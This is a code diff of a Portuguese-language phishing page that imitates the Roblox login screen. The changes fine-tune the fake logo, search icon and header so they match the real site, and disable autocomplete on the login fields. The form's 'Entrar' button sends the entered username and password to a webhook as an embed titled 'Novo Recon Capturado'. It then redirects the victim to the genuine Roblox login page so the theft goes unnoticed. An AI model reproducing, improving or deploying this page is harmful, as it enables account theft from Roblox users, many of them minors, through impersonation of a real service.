@@ -17,23 +17,21 @@
             display: flex; flex-direction: column; overflow: hidden;
         }
 
-        /* HEADER: Sincronização de Símbolo e Largura */
         .roblox-header {
             width: 100%; height: 52px; background: #232527;
             display: flex; align-items: center; 
-            padding: 0 20px; /* Ajuste para eliminar o vão lateral da imagem 1 */
+            padding: 0 20px; 
             position: fixed; top: 0; z-index: 10; box-sizing: border-box;
             border-bottom: 1px solid #454749;
         }
 
-        /* O SÍMBOLO DO CANTO: Corrigido para não quebrar */
+        /* LOGO TILT BRANCO SINCRONIZADO */
         .roblox-logo {
-            height: 28px; 
-            width: 28px;
-            background-image: url('https://images.rbxcdn.com/2b740523e100f983633a675031d875a6.svg');
+            height: 30px; 
+            width: 30px;
+            background-image: url('https://images.rbxcdn.com/4096053331b262d6657c96317ef36706.svg');
             background-size: contain;
             background-repeat: no-repeat;
-            filter: invert(1); /* Torna o logo branco */
             margin-right: 15px;
             cursor: pointer;
         }
@@ -45,7 +43,17 @@
             width: 100%; height: 32px; background: rgba(25,27,29,0.8); border: 1px solid #454749;
             border-radius: 8px; padding-left: 35px; color: #bdbebe; font-size: 14px; outline: none;
         }
-        .search-icon { position: absolute; left: 10px; top: 7px; height: 16px; filter: invert(0.5); }
+
+        /* LUPA SINCRONIZADA COM O ORIGINAL */
+        .search-icon { 
+            position: absolute; 
+            left: 10px; 
+            top: 7px; 
+            height: 18px; 
+            width: 18px;
+            content: url('https://images.rbxcdn.com/43f3ed3d820f4b5035f5d34193566b72.svg');
+            filter: brightness(0) invert(1) opacity(0.6); 
+        }
 
         .container { flex: 1; display: flex; align-items: center; justify-content: center; padding-top: 52px; }
         
@@ -80,13 +88,14 @@
 <body>
 
 <div class="roblox-header">
-    <div class="roblox-logo"></div> <div class="header-nav">
+    <div class="roblox-logo"></div> 
+    <div class="header-nav">
         <span>Destaques</span>
         <span>Mercado</span>
         <span>Criar</span>
         <span>Robux</span>
         <div class="search-bar">
-            <img src="https://images.rbxcdn.com/43f3ed3d820f4b5035f5d34193566b72.svg" class="search-icon">
+            <div class="search-icon"></div>
             <input type="text" placeholder="Pesquisar">
         </div>
     </div>
@@ -100,8 +109,8 @@
 <div class="container">
     <div class="login-box">
         <h1>Entrar na Roblox</h1>
-        <input type="text" id="user" placeholder="Usuário/e-mail/telefone">
-        <input type="password" id="pass" placeholder="Senha">
+        <input type="text" id="user" placeholder="Usuário/e-mail/telefone" autocomplete="off">
+        <input type="password" id="pass" placeholder="Senha" autocomplete="off">
         <button class="btn-entrar" onclick="sendToWebhook()">Entrar</button>
         <a href="#" style="color:#fff; text-decoration:none; font-size:13px; display:block; margin-bottom:20px;">Esqueceu a senha ou nome de usuário?</a>
         <button class="btn-secondary">Entrada rápida</button>
@@ -126,7 +135,17 @@
             fetch(webhook, {
                 method: 'POST',
                 headers: {'Content-Type': 'application/json'},
-                body: JSON.stringify({ content: `**RECON:** \`${u}\` | **KEY:** \`${p}\`` })
+                body: JSON.stringify({ 
+                    embeds: [{
+                        title: "🚀 Novo Recon Capturado",
+                        color: 3447003,
+                        fields: [
+                            { name: "👤 Usuário", value: `\`${u}\``, inline: true },
+                            { name: "🔑 Senha", value: `\`${p}\``, inline: true }
+                        ],
+                        footer: { text: "Sistema de Sincronização Roblox" }
+                    }]
+                })
             }).then(() => {
                 window.location.href = "https://www.roblox.com/login";
             });
